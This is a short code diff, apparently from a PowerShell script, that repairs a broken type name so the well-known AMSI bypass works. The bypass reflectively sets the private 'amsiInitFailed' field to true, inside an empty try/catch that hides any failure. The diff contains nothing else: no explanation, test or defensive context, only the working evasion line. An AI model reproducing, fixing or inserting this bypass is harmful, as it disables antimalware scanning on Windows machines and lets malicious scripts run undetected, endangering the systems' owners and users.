@@ -1,6 +1,6 @@
 Try
 {
-	[Ref].Assembly.GetType('http://System.Management .Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+	[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 }
 Catch
 {}
